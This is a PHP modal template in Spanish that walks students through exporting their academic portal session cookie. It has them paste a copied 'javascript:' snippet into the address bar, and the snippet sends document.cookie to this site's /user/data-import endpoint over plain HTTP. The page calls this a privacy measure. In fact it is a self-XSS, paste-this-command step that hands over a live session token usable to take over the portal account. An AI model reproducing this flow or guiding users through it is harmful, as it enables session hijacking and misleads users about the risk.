<?php

const _REQUEST_MODAL_ = true;
require('session.php');

$GET__steps = $_GET['steps'] ?? null;

?>
<modal>
  <style><?= file_get_contents(__PUBLIC_ROOT__.'/styles/user/cookie-guide.css'); ?></style>
  <?php if(!isset($GET__steps)) { ?>
    <p>
      <i>¿QUÉ ES Y POR QUÉ ES NECESARIO SACAR MANUALMENTE LA COOKIE DE SESIÓN?</i>
      <br><br>
      La cookie de sesión es un identificador temporal que se genera al iniciar sesión en el portal estudiantil y
      dura solo unos minutos. Esta cookie se usara en lugar de las credenciales de inicio de su portal academico
      para acceder a los datos requeridos (horario e historial académico), y asi mantener su privacidad 😉
      <br><br>
      Usted extraerá manualmente la cookie desde su navegador de confianza en su dispositivo,
      una vez haya iniciado la sesión en su portal academico. Sigue estos sencillos siguientes pasos 🤓
    </p>
    <br><br>
    <button type="button" class="default next-button" onclick="requestModal('/user/cookie-guide?steps')">
      <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="30px" fill="#45b39d"><path d="m381-240 424-424-57-56-368 367-169-170-57 57 227 226Zm0 113L42-466l169-170 170 170 366-367 172 168-538 538Z"/></svg>  
      <span>&nbsp;</span>
      Entendido
    </button>
  <?php } else { ?>

    <section class="swiper">
			<div class="swiper-wrapper">
        <div class="swiper-slide">
          <img src="/resources/user/cookie-cap1.jpg">
          <p>1. Inicia sesión en el portal académico</p>
        </div>
        <div class="swiper-slide">
          <img src="/resources/user/cookie-cap2.jpg">
          <p>2. Una vez logueado, borra la url del buscador y escribe el siguiente texto 👉 <span>javascript:</span></p>
        </div>
        <div class="swiper-slide">
          <img src="/resources/user/cookie-cap3.jpg">
          <p>3. Posteriormente, seguido de <span>javascript:</span> pega el siguiente texto que copiaras de aquí 👉 <u onclick="setClipboard('window.open(`http://<?= $_SERVER['HTTP_HOST'] ?>/user/data-import?data=${document.cookie}`, `_self`)');alert('Texto copiado 👍')">Copiar ✍️</u></p>
        </div>
        <div class="swiper-slide">
          <img src="/resources/user/cookie-cap4.jpg">
          <p>4. IMPORTANTE: Debes seleccionar la opción de búsqueda con el icono del mundo 👍🌐 y no la lupa 🚫🔍</p>
        </div>
        <div class="swiper-slide">
          <img style="width:100%" src="/resources/user/cookie-cap5.jpg">
          <p>5. Finalmente... si todo salió bien, los datos se abran cargado correctamente ✅ y solo deberás esperar ⏳ el resultado de su postulación 😁</p>
        </div>
      </div>
      <div class="swiper-button-next"></div>
      <div class="swiper-button-prev"></div>
      <div class="swiper-pagination"></div>
    </section>

  <?php } ?>
</modal>
